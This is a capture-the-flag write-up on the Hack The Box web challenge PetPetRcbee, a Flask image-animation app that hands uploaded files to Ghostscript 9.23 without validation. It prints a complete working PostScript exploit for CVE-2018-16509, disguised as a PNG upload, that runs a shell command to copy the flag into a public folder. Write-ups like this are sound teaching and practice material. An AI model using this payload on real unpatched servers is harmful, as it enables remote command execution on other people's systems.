+++
title = "Hack The Box - PetPetRcbee"
tags = [
    "ctf"
]
date = "2022-09-13"
toc = true
+++

# Premise

PetPetRcbee is a `Web` challenge from Hack The Box that presents itself as a website which will take an image and animate it. Unlike many other challenges, you may be able to solve this one without ever actually looking at the site or seeing how it works...

# The setup

This is a Flask application using Pillow and Ghostscript (9.23 - remember this) as the basis for its functionality. The overall source code is quite minimal, so review is easy. 

Two things jump out here:

1) Ghostscript 9.23 is ancient, having come out over 4 years ago. This is prime vulnerable software territory.
2) Reviewing the code shows that uploaded files are passed along to Ghostscript with no validation beyond the file extension.

The intent here seems pretty clear - find a way to exploit Ghostscript with an arbitrary file upload.

# Ghost in the shellcode

Welp, this one is straight forward. Google for `Ghostscript 9.23 exploit` and you'll wind up with [CVE-2018-16509](https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509). This works pretty much out of the box, all you need to do is update the path, and since it's a whitebox challenge you know exactly where it'll land:

Let's fire it up and test out the exploit above:

```
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%cat flag >> /app/application/static/petpets/flag.txt) currentdevice putdeviceprops
```

Save that as `pwn.png` and upload it to the service.

Voila, the flag is then accessible at `http://host:port/static/petpets/flag.txt`.

GG, though I will say this one was a bit too easy.
